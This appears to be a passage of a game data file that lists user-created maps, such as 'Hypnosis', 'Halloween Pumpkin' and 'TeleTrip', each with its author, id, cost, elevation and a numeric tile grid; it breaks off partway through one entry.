maps.push({name="Hypnosis",author="Mini",id="#1664623759",direction="forward",cost=322,elevation=19,map=[0,25,25,25,29,29,29,29,0,0,2,2,0,29,133,133,29,0,0,0,0,25,131,25,29,29,132,29,34,34,25,25,34,29,29,29,29,34,34,34,0,25,25,25,29,29,29,29,34,34,25,34,34,34,34,29,34,34,134,34,0,0,25,0,29,29,25,25,25,25,25,25,0,0,29,29,34,34,134,34,0,0,25,0,29,29,25,25,25,34,25,25,0,0,29,29,34,34,34,34,0,0,25,0,29,29,25,25,34,34,0,0,0,0,29,29,0,0,0,0,93,0,25,0,29,29,25,25,34,136,0,0,0,39,29,29,39,39,39,39,39,0,25,25,29,25,25,25,34,34,0,0,39,39,29,39,39,39,137,39,39,0,25,25,25,29,25,25,0,0,0,86,39,39,29,29,39,39,39,39,39,0,0,0,29,29,0,0,0,94,138,39,86,0,29,29,0,0,0,39,39,0,0,0,29,29,0,86,39,138,94,0,0,0,29,29,0,0,0,39,39,39,39,39,29,29,39,39,86,0,0,0,44,44,44,29,44,44,0,39,39,137,39,39,39,29,39,39,0,0,34,34,44,44,29,44,44,44,0,39,39,39,39,39,29,29,39,0,0,0,136,34,44,44,29,29,0,44,0,93,0,0,0,0,29,29,0,0,0,0,34,34,44,44,29,29,0,44,0,0,34,34,34,0,29,29,0,0,44,44,34,44,44,44,29,29,0,44,0,0,34,134,34,34,29,29,0,0,44,44,44,44,44,44,29,29,0,44,0,0,34,134,34,34,29,34,34,34,34,44,34,34,29,29,29,29,44,44,44,0,34,34,34,29,29,29,29,34,44,44,34,34,29,132,29,29,44,139,44,0,0,0,0,29,133,133,29,0,2,2,0,0,29,29,29,29,44,44,44,0]});
maps.push({name="Shortcut v7",author="sivi",id="#1664663636",direction="left",cost=316,elevation=9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,2,2,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,7,7,7,0,0,0,0,0,0,1,24,24,24,19,19,19,14,14,14,0,7,7,7,0,0,0,0,0,0,1,24,93,24,19,94,19,14,132,14,0,7,7,7,0,0,0,0,0,0,1,24,24,24,19,19,19,14,14,14,0,7,7,7,0,0,0,0,0,0,1,24,93,24,19,94,19,14,14,14,0,7,7,7,0,0,0,0,0,0,1,24,24,24,19,19,19,14,14,14,0,7,131,7,0,0,0,0,0,0,1,123,123,1,1,1,1,95,95,95,1,7,7,7,0,0,0,0,0,0,1,122,122,1,0,0,1,114,114,114,1,0,0,0,0,0,0,0,0,0,1,121,121,1,0,0,1,114,90,114,1,0,0,0,0,0,0,0,0,0,1,120,120,1,0,0,1,114,114,114,1,0,0,0,0,0,0,0,0,0,1,119,119,1,0,0,1,114,90,114,1,0,0,0,0,0,0,0,0,0,1,118,118,1,0,0,1,114,114,114,1,0,0,0,0,1,1,1,1,1,1,117,117,1,1,1,1,115,115,115,1,0,0,0,0,90,88,90,74,74,74,74,74,74,74,74,66,116,116,116,1,0,0,0,0,116,116,116,74,74,74,74,74,74,74,74,66,116,90,116,1,0,0,0,0,2,116,116,116,116,116,96,96,116,116,116,116,116,116,116,1,0,0,0,0,2,116,116,116,97,116,96,96,116,90,116,90,116,90,116,1,0,0,0,0,116,116,116,116,116,116,96,96,116,116,116,116,116,116,116,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0]});
maps.push({name="smoovys house",author="sivi",id="#1664718220",direction="forward",cost=404,elevation=0,map=[5,2,2,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,1,17,17,17,16,95,56,15,15,21,93,21,0,18,100,18,8,6,6,8,1,17,17,17,16,95,56,15,15,21,94,21,0,18,18,18,90,7,7,90,1,17,17,17,16,95,56,15,15,21,93,21,0,0,0,125,10,8,8,10,1,57,1,57,1,1,1,14,14,1,1,1,5,5,0,8,90,9,9,90,1,16,16,16,1,1,1,13,13,1,1,1,72,5,0,0,12,10,10,12,1,16,16,16,1,0,0,12,12,0,0,1,72,5,0,0,90,11,11,90,1,1,56,1,1,67,0,11,11,0,67,1,72,5,0,8,14,12,12,14,1,15,15,15,1,0,0,10,10,0,0,1,72,5,0,0,90,13,13,90,1,15,15,15,1,67,0,9,9,0,67,1,72,5,0,0,16,14,14,16,1,55,1,55,1,0,0,8,8,0,0,1,72,5,0,8,1,114,114,1,1,14,14,14,1,67,0,7,7,0,67,1,72,5,0,0,1,95,95,1,1,14,14,14,1,0,0,6,6,0,0,1,72,5,0,0,1,54,54,54,54,54,54,54,1,67,0,5,5,0,67,1,72,5,0,8,1,54,54,54,54,54,54,54,1,0,0,5,5,0,0,1,66,5,0,0,1,54,54,54,54,54,54,54,1,90,5,5,5,5,5,5,5,5,0,0,1,15,90,54,88,54,90,15,1,88,5,5,5,5,5,5,5,5,0,8,1,16,20,20,20,20,20,16,1,88,5,5,5,5,5,5,5,5,0,0,1,17,18,19,20,19,18,17,1,90,5,5,5,5,5,5,5,5,5,6,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1]});
maps.push({name="GEKOLONISEERD",author="chinny",id="#1664731051",direction="forward",cost=176,elevation=0,map=[0,0,0,55,2,2,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,0,0,55,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,0,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,0,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,0,0,0,55,55,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,0,0,55,55,55,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,0,0,55,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,0,55,55,55,0,0,0,0,0,0,55,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,55,55,55,55,55,0,0,0,55,55,55,55,0,55,55,0,0,0,0,0,0,55,55,0,0,0,0,0,0,0,55,55,55,55,0,0,0,0,0,0,0,55,55,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,55,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Halloween Pumpkin",author="TF2 Pencil",id="#1664820233",direction="forward",cost=191,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,36,36,56,56,0,0,0,0,0,0,0,0,0,56,56,56,36,56,56,56,56,56,36,56,56,0,0,0,0,0,0,0,56,56,56,36,36,56,56,56,36,36,36,56,56,0,0,0,0,0,0,0,56,56,56,56,36,56,56,56,56,56,36,56,56,0,0,0,0,0,125,125,56,56,56,56,56,56,36,56,36,36,36,56,56,0,0,0,0,0,125,125,56,56,56,56,56,36,36,56,56,56,36,56,56,0,0,0,0,0,0,0,56,56,56,56,56,56,36,56,36,36,36,56,56,0,0,0,0,0,0,0,56,56,56,56,36,56,56,56,56,56,36,56,56,0,0,0,0,0,0,0,56,56,56,36,36,56,56,56,36,36,36,56,56,0,0,0,0,0,0,0,0,56,56,56,36,56,56,56,56,56,36,56,56,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,36,36,56,56,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Halloween Ghost",author="TF2 Pencil",id="#1664820263",direction="right",cost=84,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,18,18,18,18,18,18,18,18,18,0,0,0,0,0,18,18,0,0,0,18,18,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,18,18,18,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,18,0,1,1,0,0,1,1,0,0,0,0,0,18,18,0,0,0,0,0,18,0,0,0,0,0,1,1,0,0,0,0,0,0,18,18,0,0,0,0,18,0,1,1,0,0,1,1,0,0,0,0,0,0,0,18,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,0,0,18,18,18,18,18,0,0,0,0,0,0,0,0,18,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Going Up Going Down",author="TF2 Pencil",id="#1664820373",direction="forward",cost=114,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,92,5,92,5,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,5,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Everyone Jump",author="TF2 Pencil",id="#1664854118",direction="right",cost=219,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,96,96,1,12,97,1,0,0,0,0,1,32,32,0,32,32,1,32,32,1,12,12,1,12,12,1,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,32,32,1,32,32,1,32,32,1,32,32,32,32,32,1,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,1,32,32,1,32,32,0,32,32,1,32,32,1,32,32,1,0,0,0,0,1,0,0,1,1,1,1,1,1,1,0,0,1,0,0,1,0,0,0,0,1,32,32,1,32,32,0,32,32,1,32,32,1,32,32,1,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,1,32,32,1,32,32,1,32,32,1,32,32,1,32,32,1,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,1,32,32,1,32,32,1,32,32,1,32,32,1,32,32,1,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,1,0,0,12,12,2,0,0,1,32,32,0,32,32,1,32,32,32,32,32,1,32,32,12,12,2,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut7",author="TF2 Pencil",id="#1664855185",direction="left",cost=172,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,35,35,35,0,35,35,0,0,0,0,0,0,0,0,0,125,10,0,0,0,0,0,0,0,0,35,0,0,0,0,0,0,0,0,0,50,50,50,50,50,50,50,0,0,0,0,0,0,0,0,0,0,0,0,0,50,50,50,50,50,50,50,0,0,0,35,0,0,0,0,1,1,1,1,1,1,1,1,1,1,50,50,0,0,0,35,0,2,10,10,110,110,110,110,110,96,110,110,110,110,50,50,0,0,0,0,0,2,10,10,110,110,110,110,110,96,110,110,110,110,50,50,0,0,0,35,0,0,10,10,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,35,0,0,10,10,35,3,3,3,3,3,3,3,3,3,35,35,1,0,0,0,0,0,10,10,35,0,0,0,0,0,0,0,0,0,0,0,1,0,0,35,0,0,10,10,35,97,0,0,0,0,0,0,0,0,0,0,1,0,0,35,0,0,11,11,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,0,0,13,13,0,0,35,0,35,0,35,0,35,0,35,0,35,0,35,97,0,0,14,14,15,0,35,0,35,0,35,0,35,0,35,0,35,0,0,0,0,0,14,14,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Candy Corn",author="TF2 Pencil",id="#1664864240",direction="left",cost=131,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,35,35,15,0,0,0,0,0,0,0,0,15,15,15,15,55,55,55,55,35,35,35,15,0,0,0,0,0,0,15,15,15,0,55,55,55,55,55,55,35,35,35,15,0,0,0,2,115,0,15,0,0,0,55,55,55,55,55,55,35,35,35,15,0,0,0,2,115,0,15,0,0,0,55,55,55,55,55,55,35,35,35,15,0,0,0,0,0,0,15,15,15,0,55,55,55,55,55,55,35,35,35,15,0,0,0,0,0,0,0,0,15,15,15,15,55,55,55,55,35,35,35,15,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,35,35,15,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,100,115,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,115,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,115,0,0,0]});
maps.push({name="AroundForShortcut8",author="TF2 Pencil",id="#1664867448",direction="forward",cost=319,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,0,0,0,0,0,14,76,14,76,76,14,1,14,14,0,0,0,0,0,0,0,0,0,0,0,76,76,76,76,76,76,1,14,14,14,14,14,14,14,14,96,96,0,0,0,14,76,1,76,76,14,1,14,14,14,14,14,14,14,14,96,96,0,0,0,76,76,1,97,14,14,1,0,0,1,1,1,1,1,1,14,14,0,0,0,14,76,1,1,1,1,1,0,0,1,14,14,14,102,1,14,14,0,0,0,76,76,14,142,142,142,142,14,14,1,14,89,89,14,1,98,98,0,0,0,14,76,14,142,142,142,142,14,14,1,14,89,89,89,1,98,98,0,0,1,1,1,1,1,1,1,1,0,0,1,14,89,89,89,1,14,14,0,0,0,14,14,16,16,18,18,1,0,0,1,14,89,89,89,1,14,14,0,0,0,0,0,0,0,0,20,1,14,14,1,14,89,89,89,1,101,101,0,0,0,14,1,24,24,0,20,1,0,0,1,14,89,89,89,1,101,101,0,0,0,0,1,99,24,22,22,1,0,0,1,14,14,14,14,1,14,14,0,0,0,14,1,1,1,1,1,1,14,14,1,1,1,1,14,1,14,14,0,0,0,0,0,14,142,142,142,142,14,14,0,0,14,14,14,14,14,14,0,0,0,14,0,14,142,142,142,142,14,14,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="AroundForShortcut9",author="TF2 Pencil",id="#1664867484",direction="right",cost=198,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,29,0,29,29,0,0,0,0,35,35,33,33,31,31,9,96,96,9,9,0,29,0,29,97,0,0,0,0,35,35,33,33,31,31,9,96,96,9,9,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,0,0,0,17,17,0,1,1,1,1,1,1,98,98,1,1,1,0,0,0,0,0,0,99,17,0,1,22,22,22,1,1,9,9,101,9,103,9,9,9,2,0,0,17,17,0,1,22,102,22,1,1,9,9,101,9,103,9,9,9,2,0,0,92,92,0,1,22,22,22,1,1,1,1,1,1,1,0,0,0,0,0,0,108,108,0,1,1,141,141,0,0,0,0,0,0,0,8,8,0,0,0,0,108,108,0,0,0,8,8,0,0,0,0,104,19,0,8,8,0,0,0,0,108,108,0,0,0,8,8,0,0,0,0,19,19,0,8,8,0,0,0,0,108,108,108,108,8,8,8,8,8,8,8,4,4,8,8,8,0,0,0,0,108,108,108,108,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut10",author="TF2 Pencil",id="#1664867522",direction="forward",cost=239,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,122,122,121,120,119,118,117,116,115,114,113,112,111,111,11,11,0,0,0,0,122,122,121,120,119,118,117,116,115,114,113,112,111,111,11,11,0,0,0,0,42,42,0,0,0,0,0,0,0,0,0,0,0,1,11,11,0,0,0,0,42,42,0,42,42,0,42,42,0,42,42,0,42,1,11,11,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,42,1,11,11,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,44,1,11,11,0,0,0,0,0,0,0,1,76,24,76,24,76,24,24,0,44,1,11,11,0,0,0,0,0,0,0,1,24,1,1,1,1,1,24,44,44,1,11,11,0,0,0,0,0,0,0,1,76,1,0,0,0,1,24,44,44,1,96,96,0,0,0,0,42,42,0,1,24,1,0,0,1,1,1,1,1,1,96,96,0,0,0,0,42,42,0,1,76,1,0,0,1,97,24,11,11,11,11,11,0,0,0,0,42,42,0,1,24,1,1,1,1,1,24,11,66,66,11,11,0,0,0,0,42,42,0,1,24,76,83,24,76,83,24,11,66,66,11,11,0,0,0,0,42,42,0,1,1,1,1,1,1,1,1,11,66,66,11,11,0,0,0,0,97,42,0,42,42,0,42,42,0,42,42,11,66,66,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="a s s t h e t i c",author="sivi",id="#1664889103",direction="left",cost=189,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,2,2,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,30,30,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,30,30,30,30,0,0,0,0,0,0,13,90,47,47,47,47,0,0,30,30,30,30,30,30,30,30,6,6,0,0,13,47,47,47,47,47,0,0,30,30,30,30,30,30,30,30,6,6,6,0,13,47,47,47,47,47,0,0,30,30,30,30,30,30,30,30,6,6,6,0,96,47,47,47,90,47,0,0,30,30,30,30,30,30,30,30,6,6,0,0,139,13,13,13,13,13,0,0,0,0,30,30,30,30,0,0,6,6,6,0,0,0,0,0,33,0,0,0,0,0,30,30,30,30,0,0,0,5,5,0,0,0,0,0,33,0,0,0,0,0,0,0,10,10,0,0,0,25,25,0,0,0,0,0,33,0,0,0,0,0,0,0,8,8,0,0,0,26,26,0,0,0,0,0,33,0,0,0,0,0,0,0,6,6,0,0,0,27,27,0,0,0,0,0,32,0,0,0,0,0,0,0,5,5,0,0,0,28,28,0,0,0,0,0,32,0,0,0,0,0,0,0,5,5,0,0,2,9,9,9,0,0,0,0,32,0,0,0,0,30,0,7,5,5,0,0,2,9,9,9,0,0,0,0,32,0,0,0,0,31,11,9,5,5,0,0,9,9,9,9,0,0,0,0,31,0,0,0,0,31,11,7,5,93,97,0,0,0,0,9,0,0,0,0,31,0,0,0,0,31,11,9,5,5,33,0,0,0,0,10,0,0,0,0,31,0,0,0,0,32,0,0,0,0,33,0,100,15,13,11,0,0,0,0,31,31,32,32,32,33,32,0,0,32,33,0]});
maps.push({name="Hot hot land",author="Luffaren",id="#1664959122",direction="right",cost=541,elevation=19,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,5,5,81,77,0,0,0,0,77,77,0,0,0,5,5,76,76,5,5,5,5,84,84,77,0,0,0,0,5,5,0,0,5,5,76,76,76,76,84,84,84,84,84,77,0,0,0,0,5,5,5,5,5,76,76,76,76,76,76,84,84,84,84,77,0,0,0,5,5,5,76,76,76,76,76,76,76,76,76,76,5,5,84,77,0,0,0,6,6,76,76,76,76,76,76,76,76,76,75,5,5,141,5,0,0,0,7,7,82,76,76,76,76,5,76,76,76,75,5,20,20,21,5,5,0,0,8,82,82,82,76,5,94,5,5,76,75,5,20,20,20,21,21,5,0,77,83,83,83,83,83,76,5,93,76,76,75,5,20,20,76,21,21,22,0,0,10,10,81,81,76,76,5,76,76,75,5,19,20,76,76,77,22,22,0,0,10,11,81,76,76,76,76,76,76,75,18,19,20,76,76,77,23,0,0,0,0,11,12,75,76,76,76,76,75,17,18,18,76,76,76,77,23,0,0,0,0,12,12,12,75,76,76,75,16,17,0,77,76,76,76,77,24,24,0,77,0,0,0,12,12,75,75,15,16,0,0,0,77,76,24,24,24,24,24,24,77,0,0,12,12,13,14,15,0,0,0,0,0,24,24,24,24,24,2,100,24,0,0,0,12,13,14,0,0,0,0,0,92,24,24,24,24,24,2,24,24,77,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,77,24,24,77,0,0,0,0,0,0,0,0,0,0,0,77,77,24,24,24,0,77,77,0,0,24,93,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="TeleTrip",author="Mini",id="#1664969027",direction="forward",cost=270,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,0,109,109,0,0,0,1,90,90,1,1,16,90,1,0,0,1,1,1,1,0,109,109,0,0,1,123,124,123,124,90,18,18,19,0,1,14,14,13,14,1,109,109,0,0,1,90,137,137,124,19,134,134,18,0,1,13,133,133,13,1,109,108,0,0,1,123,124,123,124,18,18,19,19,0,1,14,90,13,14,1,90,109,0,0,0,1,90,124,1,0,19,20,0,0,0,0,12,14,0,0,109,109,0,0,0,0,124,123,0,0,19,90,0,0,0,0,13,86,0,0,108,108,0,0,0,0,86,124,0,0,18,20,0,0,0,0,13,12,0,0,109,90,0,0,94,90,124,124,0,0,86,20,0,37,93,0,14,14,0,0,109,109,109,94,94,124,123,123,0,0,19,20,0,37,100,0,14,90,0,0,86,109,109,94,0,0,124,90,0,0,19,90,0,0,0,0,12,13,0,0,109,108,0,0,0,0,124,124,0,0,18,20,0,0,0,0,14,86,0,0,109,90,0,0,0,0,90,86,0,0,90,19,0,0,0,0,90,14,0,1,109,109,1,0,0,0,124,123,1,16,18,18,20,1,0,14,14,12,14,109,108,109,109,1,0,0,123,124,1,18,136,136,20,1,0,14,132,132,14,90,131,131,90,1,0,0,90,124,1,16,16,18,90,1,0,90,14,14,14,109,109,90,109,1,0,0,124,124,0,1,1,1,1,0,0,1,90,15,1,1,108,109,1,0,0,0,124,124,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fight The Collective",author="Mini",id="#1664969141",direction="forward",cost=250,elevation=0,map=[0,0,0,0,0,24,0,0,0,0,0,0,0,5,5,6,6,2,2,7,0,0,0,0,23,22,22,0,0,0,0,0,0,0,5,5,6,6,7,7,0,0,0,0,20,24,24,22,0,0,123,0,0,0,0,5,5,6,6,7,0,0,0,0,20,22,23,0,0,109,120,120,0,0,0,0,5,5,6,7,0,0,0,0,0,23,0,0,0,120,111,123,120,0,15,0,5,5,6,6,0,0,0,0,0,0,0,0,0,109,121,120,0,0,11,13,5,5,6,6,0,0,0,122,123,0,0,0,0,0,120,0,0,0,0,11,13,5,6,6,0,0,123,24,76,123,0,0,0,0,0,0,0,0,0,0,45,5,6,6,0,123,0,0,66,0,123,0,0,0,0,15,15,15,0,0,47,5,5,6,122,24,0,73,1,73,24,121,0,0,11,15,11,15,45,45,47,45,47,47,122,76,0,66,1,73,0,121,0,0,11,10,10,15,45,47,45,47,47,47,64,123,0,0,66,0,123,0,0,0,0,11,10,10,0,0,47,5,5,6,63,62,121,76,24,122,0,0,0,0,0,0,0,0,0,0,45,5,5,6,62,64,0,123,122,0,0,0,0,0,73,0,0,0,0,15,15,5,5,6,64,61,0,0,0,0,0,0,0,73,66,73,0,0,13,11,5,5,6,6,62,63,62,0,0,40,0,0,0,66,73,65,73,0,11,0,5,5,6,7,0,61,64,0,40,42,40,0,0,65,73,66,0,0,0,0,5,6,6,7,63,64,61,0,42,44,42,40,0,0,73,0,0,0,0,5,6,6,7,7,63,61,0,0,42,40,44,0,0,0,0,0,0,0,5,5,6,6,7,7,61,63,0,0,0,42,0,0,0,0,0,0,0,5,5,6,7,2,2,7]});
maps.push({name="kz gy agitation 